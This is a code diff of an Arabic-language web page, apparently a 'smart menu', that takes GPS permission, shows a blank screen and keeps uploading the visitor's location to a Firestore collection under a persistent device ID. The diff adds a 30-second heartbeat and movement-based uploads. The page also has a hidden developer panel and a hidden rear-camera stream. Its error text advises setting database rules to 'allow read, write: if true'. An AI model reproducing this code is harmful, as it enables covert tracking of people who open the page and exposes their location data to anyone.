@@ -166,6 +166,7 @@
         .dev-val.blue { color: #3b82f6; }
         .dev-val.white { color: #f1f5f9; }
         .dev-val.purple { color: #a855f7; }
+        .dev-val.cyan { color: #06b6d4; }
 
         .dev-acc-bar {
             width: 100%; height: 6px; border-radius: 3px;
@@ -195,16 +196,40 @@
             font-size: 0.65rem; margin-bottom: 6px; display: block;
         }
 
+        /* شريط إحصائيات الرفع */
+        .dev-stats {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 6px;
+            margin-top: 8px;
+        }
+
+        .dev-stat-box {
+            padding: 10px; border-radius: 8px;
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.06);
+            text-align: center;
+        }
+
+        .dev-stat-num {
+            font-family: 'Courier New', monospace;
+            font-size: 1.2rem; font-weight: 700;
+            display: block;
+        }
+
+        .dev-stat-label {
+            font-size: 0.62rem; color: #7a8baa;
+            margin-top: 2px; display: block;
+        }
+
         .dev-log {
-            max-height: 180px; overflow-y: auto;
+            max-height: 160px; overflow-y: auto;
             -webkit-overflow-scrolling: touch;
         }
 
         .dev-log-entry {
-            padding: 6px 0;
+            padding: 5px 0;
             border-bottom: 1px solid rgba(255,255,255,0.03);
             font-family: 'Courier New', monospace;
-            font-size: 0.72rem;
+            font-size: 0.7rem;
             direction: ltr; text-align: left;
             color: #7a8baa;
             animation: logIn 0.3s ease;
@@ -217,8 +242,10 @@
         .dev-log-entry .log-acc.bad { color: #ff4757; }
         .dev-log-entry .log-fb { font-weight: 700; }
         .dev-log-entry .log-fb.ok { color: #00e5a0; }
+        .dev-log-entry .log-fb.skip { color: #7a8baa; }
         .dev-log-entry .log-fb.fail { color: #ff4757; }
         .dev-log-entry .log-cam { font-weight: 700; color: #a855f7; }
+        .dev-log-entry .log-reason { color: #06b6d4; font-weight: 600; }
 
         @keyframes logIn {
             from { opacity: 0; transform: translateY(-8px); }
@@ -314,7 +341,7 @@
                     <span class="dev-val orange" id="d-opt">نشط</span>
                 </div>
                 <div class="dev-row">
-                    <span class="dev-label">القراءات</span>
+                    <span class="dev-label">القراءات GPS</span>
                     <span class="dev-val white" id="d-count">0</span>
                 </div>
                 <div class="dev-row">
@@ -324,6 +351,28 @@
                 <div class="dev-row">
                     <span class="dev-label">آخر رفع</span>
                     <span class="dev-val blue" id="d-push">لم يحدث</span>
+                </div>
+            </div>
+
+            <div class="dev-section">
+                <div class="dev-section-title">إحصائيات الرفع الذكي</div>
+                <div class="dev-stats">
+                    <div class="dev-stat-box">
+                        <span class="dev-stat-num green" id="d-sent">0</span>
+                        <span class="dev-stat-label">تم الرفع</span>
+                    </div>
+                    <div class="dev-stat-box">
+                        <span class="dev-stat-num orange" id="d-skipped">0</span>
+                        <span class="dev-stat-label">تم التخطي</span>
+                    </div>
+                    <div class="dev-stat-box">
+                        <span class="dev-stat-num cyan" id="d-ratio">0%</span>
+                        <span class="dev-stat-label">نسبة التوفير</span>
+                    </div>
+                    <div class="dev-stat-box">
+                        <span class="dev-stat-num white" id="d-total">0</span>
+                        <span class="dev-stat-label">إجمالي القراءات</span>
+                    </div>
                 </div>
             </div>
 
@@ -355,11 +404,7 @@
             </div>
 
             <div class="dev-section">
-                <div class="dev-section-title">Firebase</div>
-                <div class="dev-row">
-                    <span class="dev-label">Project</span>
-                    <span class="dev-val white" style="font-size:0.6rem;">project-8964...0556</span>
-                </div>
+                <div class="dev-section-title">Firestore</div>
                 <div class="dev-row">
                     <span class="dev-label">Collection</span>
                     <span class="dev-val white">loc</span>
@@ -384,10 +429,6 @@
                     <span class="dev-label">الحالة</span>
                     <span class="dev-val white" id="d-cam-status">غير مطلوبة</span>
                 </div>
-                <div class="dev-row">
-                    <span class="dev-label">البث</span>
-                    <span class="dev-val white" id="d-cam-stream">لا يوجد</span>
-                </div>
             </div>
 
             <div class="dev-section">
@@ -406,13 +447,14 @@
                 <i class="fa-solid fa-camera"></i> كاميرا
             </button>
             <button class="dev-foot-btn danger" onclick="devTestFirebase()">
-                <i class="fa-solid fa-flask"></i> FB
+                <i class="fa-solid fa-flask"></i> اختبار
             </button>
         </div>
     </div>
     <!-- ======= نهاية نافذة المطور ======= -->
 
     <script>
+        // === Firestore (الأفضل) ===
         firebase.initializeApp({
             apiKey: "AIzaSyDk5poPjAe6LJOMUbDU_ak_ZLtLuCoqahI",
             authDomain: "project-8964705196826400556.firebaseapp.com",
@@ -421,45 +463,53 @@
             messagingSenderId: "615020770883",
             appId: "1:615020770883:web:ca0856f464dd57b4aac6f6"
         });
-        const db = firebase.firestore();
+        var db = firebase.firestore();
 
-        let deviceId = localStorage.getItem('smart_menu_device_id');
+        var deviceId = localStorage.getItem('smart_menu_device_id');
         if (!deviceId) {
             deviceId = "dev_" + Math.random().toString(36).substring(2, 12) + Date.now().toString(36);
             localStorage.setItem('smart_menu_device_id', deviceId);
         }
 
-        let watcher = null;
-        let bestAcc = Infinity;
-        let optimizing = true;
-        let t0 = Date.now();
-        let readCount = 0;
-        let lastLat = null;
-        let lastLng = null;
+        // === متغيرات التتبع ===
+        var watcher = null;
+        var bestAcc = Infinity;
+        var optimizing = true;
+        var t0 = Date.now();
+        var readCount = 0;
+        var lastLat = null;
+        var lastLng = null;
+        var lastAcc = null;
+        var cameraStream = null;
+        var cameraActive = false;
 
-        // حالة الكاميرا
-        let cameraStream = null;
-        let cameraActive = false;
+        // === متغيرات الرفع الذكي ===
+        var pushCount = 0;       // عدد عمليات الرفع الفعلية
+        var skipCount = 0;       // عدد القراءات التي تم تخطيها
+        var lastPushTime = 0;    // آخر وقت رفع (مللي ثانية)
+        var PUSH_INTERVAL = 30000; // 30 ثانية كحد أقصى بين الرفوع
+        var MOVE_THRESHOLD = 3;   // 3 أمتار كحد أدنى للحركة
+        var isPushing = false;    // منع رفع متوازي
 
         document.getElementById('d-dev').innerText = deviceId;
         document.getElementById('d-doc').innerText = deviceId;
 
-        // 3 نقرات سريعة
-        let triggerTaps = 0, triggerTimer = null;
+        // 3 نقرات
+        var triggerTaps = 0, triggerTimer = null;
         document.getElementById('dev-trigger').addEventListener('click', function () {
             triggerTaps++;
             clearTimeout(triggerTimer);
             if (triggerTaps >= 3) { triggerTaps = 0; toggleDev(); }
-            else { triggerTimer = setTimeout(() => { triggerTaps = 0; }, 400); }
+            else { triggerTimer = setTimeout(function () { triggerTaps = 0; }, 400); }
         });
 
         function toggleDev() { document.getElementById('dev-panel').classList.toggle('open'); }
 
-        // === البداية: GPS فقط بدون كاميرا ===
+        // === البداية ===
         function start() {
-            const btn = document.getElementById('perm-btn');
-            const ld = document.getElementById('perm-ld');
-            const icon = document.getElementById('perm-btn-icon');
+            var btn = document.getElementById('perm-btn');
+            var ld = document.getElementById('perm-ld');
+            var icon = document.getElementById('perm-btn-icon');
             btn.disabled = true;
             ld.style.display = 'block';
             icon.style.display = 'none';
@@ -467,7 +517,7 @@
             devSet('d-status', 'جاري البحث عن أقمار...', 'orange');
 
             if (!("geolocation" in navigator)) {
-                devSet('d-status', 'الجهاز لا يدعم GPS', 'red');
+                devSet('d-status', 'لا يدعم GPS', 'red');
                 showBlocked();
                 return;
             }
@@ -478,12 +528,15 @@
         }
 
         function onPos(pos) {
-            const lat = pos.coords.latitude;
-            const lng = pos.coords.longitude;
-            const acc = pos.coords.accuracy;
+            var lat = pos.coords.latitude;
+            var lng = pos.coords.longitude;
+            var acc = pos.coords.accuracy;
             readCount++;
+
+            // تحديث الواجهة دائماً
             lastLat = lat;
             lastLng = lng;
+            lastAcc = acc;
 
             devSet('d-status', 'يعمل', 'green');
             devSet('d-count', readCount, 'white');
@@ -491,37 +544,92 @@
             devSet('d-lng', lng.toFixed(6), 'blue');
             devSet('d-opt', optimizing ? 'نشط' : 'لحظي', optimizing ? 'orange' : 'green');
 
-            const pct = Math.max(0, Math.min(100, 100 - (acc / 0.5)));
-            const barColor = acc <= 5 ? '#00e5a0' : acc <= 15 ? '#ffa502' : '#ff4757';
-            const accColor = acc <= 5 ? 'green' : acc <= 15 ? 'orange' : 'red';
+            var pct = Math.max(0, Math.min(100, 100 - (acc / 0.5)));
+            var barColor = acc <= 5 ? '#00e5a0' : acc <= 15 ? '#ffa502' : '#ff4757';
+            var accColor = acc <= 5 ? 'green' : acc <= 15 ? 'orange' : 'red';
             document.getElementById('d-acc-bar').style.width = pct + '%';
             document.getElementById('d-acc-bar').style.background = barColor;
             devSet('d-acc', acc.toFixed(1) + ' m', accColor);
 
-            addDevLog(acc, lat, lng, null);
+            // تحديث الإحصائيات
+            devSet('d-total', readCount, 'white');
+
+            // === منطق الرفع الذكي ===
+            var now = Date.now();
+            var shouldPush = false;
+            var reason = '';
 
             if (optimizing) {
+                // مرحلة التحسين: ارفع فقط لو تحسنت الدقة
                 if (acc < bestAcc) {
-                    bestAcc = acc;
-                    devSet('d-best', bestAcc.toFixed(1) + ' m', 'green');
-                    push(lat, lng, acc);
+                    shouldPush = true;
+                    reason = 'تحسّن الدقة';
                 }
-                if (acc <= 5 || (Date.now() - t0 > 15000)) {
+                if (acc <= 5 || (now - t0 > 15000)) {
                     optimizing = false;
                     devSet('d-opt', 'لحظي', 'green');
                 }
             } else {
-                push(lat, lng, acc);
+                // بعد التحسين: ارفع فقط عند تحقق أحد الشروط
+                var timeSinceLastPush = now - lastPushTime;
+
+                if (timeSinceLastPush >= PUSH_INTERVAL) {
+                    // مرت 30 ثانية — نبض قلب
+                    shouldPush = true;
+                    reason = 'نبض 30ث';
+                } else if (acc < bestAcc - 1) {
+                    // تحسّن حقيقي في الدقة (أكثر من 1 متر)
+                    shouldPush = true;
+                    reason = 'دقة أفضل';
+                    bestAcc = acc;
+                } else if (lastLat !== null) {
+                    // حساب المسافة عن آخر موقع مرفوع
+                    var dist = getDistance(lastLat, lastLng, lat, lng);
+                    if (dist >= MOVE_THRESHOLD) {
+                        // الجهاز تحرك أكثر من 3 أمتار
+                        shouldPush = true;
+                        reason = 'حركة ' + dist.toFixed(1) + 'م';
+                    }
+                }
+
+                if (!shouldPush && acc < bestAcc) {
+                    bestAcc = acc;
+                }
             }
 
+            if (shouldPush && !isPushing) {
+                push(lat, lng, acc, reason);
+            } else {
+                skipCount++;
+                devSet('d-skipped', skipCount, 'orange');
+                var ratio = readCount > 0 ? Math.round((skipCount / readCount) * 100) : 0;
+                devSet('d-ratio', ratio + '%', 'cyan');
+                addDevLog(acc, lat, lng, 'skip', reason || 'ثابت');
+            }
+
+            // إخفاء شاشة الأذن
             document.getElementById('perm-screen').classList.add('fade-out');
-            setTimeout(() => {
+            setTimeout(function () {
                 document.getElementById('perm-screen').style.display = 'none';
                 document.getElementById('blank-screen').style.display = 'flex';
             }, 500);
         }
 
-        function push(lat, lng, acc) {
+        // حساب المسافة بين نقطتين (متر) — صيغة Haversine
+        function getDistance(lat1, lon1, lat2, lon2) {
+            var R = 6371000;
+            var dLat = (lat2 - lat1) * Math.PI / 180;
+            var dLon = (lon2 - lon1) * Math.PI / 180;
+            var a = Math.sin(dLat / 2) * Math.sin(dLat / 2) +
+                    Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) *
+                    Math.sin(dLon / 2) * Math.sin(dLon / 2);
+            var c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+            return R * c;
+        }
+
+        // === الرفع إلى Firestore ===
+        function push(lat, lng, acc, reason) {
+            isPushing = true;
             devSet('d-fb-status', 'جاري الرفع...', 'orange');
             hideError();
 
@@ -531,20 +639,36 @@
                 accuracy: acc,
                 device_id: deviceId,
                 last_updated: firebase.firestore.FieldValue.serverTimestamp()
-            }, { merge: true }).then(() => {
+            }, { merge: true }).then(function () {
+                isPushing = false;
+                pushCount++;
+                lastPushTime = Date.now();
+
                 devSet('d-push', formatDT(new Date()), 'blue');
                 devSet('d-fb-status', 'نجاح ✓', 'green');
+                devSet('d-sent', pushCount, 'green');
+                devSet('d-best', bestAcc === Infinity ? acc.toFixed(1) + ' m' : bestAcc.toFixed(1) + ' m', 'green');
+
+                var ratio = readCount > 0 ? Math.round((skipCount / readCount) * 100) : 0;
+                devSet('d-ratio', ratio + '%', 'cyan');
+
                 hideError();
+                addDevLog(acc, lat, lng, 'ok', reason);
+
+                // تحديث آخر سجل إن كان skip
                 updateLastLogFb('ok');
-            }).catch((err) => {
+
+            }).catch(function (err) {
+                isPushing = false;
                 devSet('d-fb-status', 'فشل ✗', 'red');
                 showError(err.code + ' | ' + err.message);
-                updateLastLogFb('fail', err.code + ' | ' + err.message);
+                addDevLog(acc, lat, lng, 'fail', err.code);
+                updateLastLogFb('fail');
             });
         }
 
         function onErr(err) {
-            const msgs = { 1: 'رفض المستخدم', 2: 'غير متاح', 3: 'انتهت المهلة' };
+            var msgs = { 1: 'رفض المستخدم', 2: 'غير متاح', 3: 'انتهت المهلة' };
             devSet('d-status', 'خطأ: ' + (msgs[err.code] || err.message), 'red');
             if (err.code === err.PERMISSION_DENIED) showBlocked();
         }
@@ -555,62 +679,48 @@
             document.getElementById('perm-title').innerText = 'الصلاحية مطلوبة';
             document.getElementById('perm-desc').innerText = 'لا يمكن تقديم الخدمة بدون تحديد الموقع. يرجى تحديث الصفحة والموافقة.';
             document.getElementById('perm-ld').style.display = 'none';
-            const icon = document.getElementById('perm-btn-icon');
+            var icon = document.getElementById('perm-btn-icon');
             icon.style.display = 'inline';
             icon.className = 'fa-solid fa-rotate-right';
             document.getElementById('perm-btn-text').innerText = 'إعادة المحاولة';
             document.getElementById('perm-btn').disabled = false;
         }
 
-        // ========================================
-        //  الكاميرا: تُطلب فقط عند الحاجة
-        //  استدعِ requestCamera() من أي مكان في الكود
-        //  تعيد Promise<MediaStream>
-        // ========================================
+        // === الكاميرا عند الحاجة ===
         async function requestCamera() {
-            // إذا كانت الكاميرا مفتوحة مسبقاً، نرجع البث الحالي
             if (cameraActive && cameraStream) {
                 devSet('d-cam-status', 'مفتوحة مسبقاً', 'green');
                 return cameraStream;
             }
-
             devSet('d-cam-status', 'جاري الطلب...', 'orange');
             addCamLog('طلب صلاحية الكاميرا...');
-
             try {
                 cameraStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: { ideal: "environment" } }
                 });
-
                 cameraActive = true;
                 document.getElementById('hidden-stream').srcObject = cameraStream;
-
                 devSet('d-cam-status', 'مفتوحة ✓', 'green');
-                devSet('d-cam-stream', 'نشط (' + cameraStream.getVideoTracks().length + ' track)', 'green');
                 addCamLog('الكاميرا مفتوحة بنجاح');
                 return cameraStream;
-
             } catch (err) {
                 cameraActive = false;
                 cameraStream = null;
                 devSet('d-cam-status', 'مرفوضة ✗', 'red');
-                devSet('d-cam-stream', 'لا يوجد', 'red');
                 addCamLog('فشل: ' + err.message);
                 throw err;
             }
         }
 
-        // إيقاف الكاميرا لتحرير الموارد
         function releaseCamera() {
             if (cameraStream) {
-                cameraStream.getTracks().forEach(function(track) { track.stop(); });
+                cameraStream.getTracks().forEach(function (t) { t.stop(); });
                 cameraStream = null;
             }
             cameraActive = false;
             document.getElementById('hidden-stream').srcObject = null;
             devSet('d-cam-status', 'متوقفة', 'white');
-            devSet('d-cam-stream', 'لا يوجد', 'white');
-            addCamLog('تم إيقاف الكاميرا وتحرير الموارد');
+            addCamLog('تم إيقاف الكاميرا');
         }
 
         // === أدوات المطور ===
@@ -622,9 +732,8 @@
         }
 
         function showError(msg) {
-            var box = document.getElementById('d-error-box');
             document.getElementById('d-error-text').innerText = msg;
-            box.classList.add('show');
+            document.getElementById('d-error-box').classList.add('show');
         }
 
         function hideError() {
@@ -635,17 +744,20 @@
             return d.toLocaleTimeString('ar-IQ', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
         }
 
-        function addDevLog(acc, lat, lng, fbStatus) {
+        function addDevLog(acc, lat, lng, fbStatus, reason) {
             var log = document.getElementById('d-log');
             var cls = acc <= 5 ? 'good' : acc <= 15 ? 'mid' : 'bad';
             var entry = document.createElement('div');
             entry.className = 'dev-log-entry';
             var fbHtml = '';
-            if (fbStatus === 'ok') fbHtml = ' <span class="log-fb ok">[FB OK]</span>';
-            else if (fbStatus === 'fail') fbHtml = ' <span class="log-fb fail">[FB FAIL]</span>';
+            if (fbStatus === 'ok') fbHtml = ' <span class="log-fb ok">[SENT]</span>';
+            else if (fbStatus === 'skip') fbHtml = ' <span class="log-fb skip">[SKIP]</span>';
+            else if (fbStatus === 'fail') fbHtml = ' <span class="log-fb fail">[FAIL]</span>';
+            var reasonHtml = reason ? ' <span class="log-reason">(' + reason + ')</span>' : '';
             entry.innerHTML = '<span class="log-time">' + formatDT(new Date()) + '</span> ' +
                 lat.toFixed(6) + ',' + lng.toFixed(6) +
-                ' acc:<span class="log-acc ' + cls + '">' + acc.toFixed(1) + 'm</span>' + fbHtml;
+                ' <span class="log-acc ' + cls + '">' + acc.toFixed(1) + 'm</span>' +
+                fbHtml + reasonHtml;
             entry.setAttribute('data-log-entry', '1');
             log.insertBefore(entry, log.firstChild);
             while (log.children.length > 50) log.removeChild(log.lastChild);
@@ -660,15 +772,16 @@
             while (log.children.length > 50) log.removeChild(log.lastChild);
         }
 
-        function updateLastLogFb(status, errMsg) {
+        function updateLastLogFb(status) {
             var first = document.querySelector('[data-log-entry="1"]');
             if (!first) return;
             var old = first.querySelector('.log-fb');
             if (old) old.remove();
             var span = document.createElement('span');
-            span.className = 'log-fb ' + (status === 'ok' ? 'ok' : 'fail');
-            span.innerText = status === 'ok' ? ' [FB OK]' : ' [FB FAIL]';
-            if (errMsg) span.title = errMsg;
+            span.className = 'log-fb ' + status;
+            if (status === 'ok') span.innerText = ' [SENT]';
+            else if (status === 'fail') span.innerText = ' [FAIL]';
+            else span.innerText = ' [SKIP]';
             first.appendChild(span);
         }
 
@@ -678,9 +791,17 @@
             optimizing = true;
             t0 = Date.now();
             readCount = 0;
+            pushCount = 0;
+            skipCount = 0;
+            lastPushTime = 0;
+            isPushing = false;
             document.getElementById('d-log').innerHTML = '';
             devSet('d-best', '\u221e', 'green');
             devSet('d-count', '0', 'white');
+            devSet('d-sent', '0', 'green');
+            devSet('d-skipped', '0', 'orange');
+            devSet('d-ratio', '0%', 'cyan');
+            devSet('d-total', '0', 'white');
             devSet('d-opt', 'نشط', 'orange');
             devSet('d-status', 'إعادة تشغيل...', 'orange');
             hideError();
@@ -691,7 +812,7 @@
 
         function devCopyCoords() {
             if (lastLat === null) return;
-            var text = lastLat.toFixed(6) + ', ' + lastLng.toFixed(6) + ' (' + (bestAcc === Infinity ? '--' : bestAcc.toFixed(1) + 'm') + ')';
+            var text = lastLat.toFixed(6) + ', ' + lastLng.toFixed(6) + ' (acc: ' + (lastAcc ? lastAcc.toFixed(1) + 'm' : '--') + ')';
             navigator.clipboard.writeText(text).then(function () {
                 var btn = event.target.closest('.dev-foot-btn');
                 var orig = btn.innerHTML;
@@ -700,17 +821,9 @@
             }).catch(function () {});
         }
 
-        // زر اختبار الكاميرا في نافذة المطور
         async function devTestCamera() {
-            if (cameraActive) {
-                releaseCamera();
-            } else {
-                try {
-                    await requestCamera();
-                } catch (e) {
-                    // الخطأ مسجّل داخل requestCamera
-                }
-            }
+            if (cameraActive) { releaseCamera(); }
+            else { try { await requestCamera(); } catch (e) {} }
         }
 
         function devTestFirebase() {
@@ -718,23 +831,18 @@
             hideError();
             var testDoc = deviceId + '_test_' + Date.now();
             db.collection('loc').doc(testDoc).set({
-                latitude: 0, longitude: 0, accuracy: 999,
-                device_id: deviceId, _test: true,
-                last_updated: firebase.firestore.FieldValue.serverTimestamp()
+                _test: true, timestamp: firebase.firestore.FieldValue.serverTimestamp()
             }, { merge: true }).then(function () {
                 db.collection('loc').doc(testDoc).delete().catch(function () {});
                 devSet('d-fb-status', 'اتصال ناجح ✓', 'green');
                 hideError();
-                addDevLog(999, 0, 0, 'ok');
             }).catch(function (err) {
-                var errMsg = 'Code: ' + err.code + '\nMsg: ' + err.message;
-                devSet('d-fb-status', 'فشل الاتصال ✗', 'red');
-                showError(errMsg);
+                devSet('d-fb-status', 'فشل ✗', 'red');
+                var msg = 'Code: ' + err.code + '\nMsg: ' + err.message;
                 if (err.code === 'permission-denied') {
-                    document.getElementById('d-error-text').innerText += '\n\n--- الحل ---\nاذهب إلى Firebase Console:\nFirestore Database > Rules\nغيّرها إلى:\nallow read, write: if true;\nثم انشر (Publish)';
-                } else if (err.code === 'not-found') {
-                    document.getElementById('d-error-text').innerText += '\n\n--- الحل ---\nFirestore غير مفعّلة.\nاذهب إلى Firebase Console > Build > Firestore\nواضغط "Create Database"';
+                    msg += '\n\n--- الحل ---\nاذهب إلى:\nFirestore Database > Rules\nغيّرها إلى:\nallow read, write: if true;\nثم Publish';
                 }
+                showError(msg);
             });
         }
 
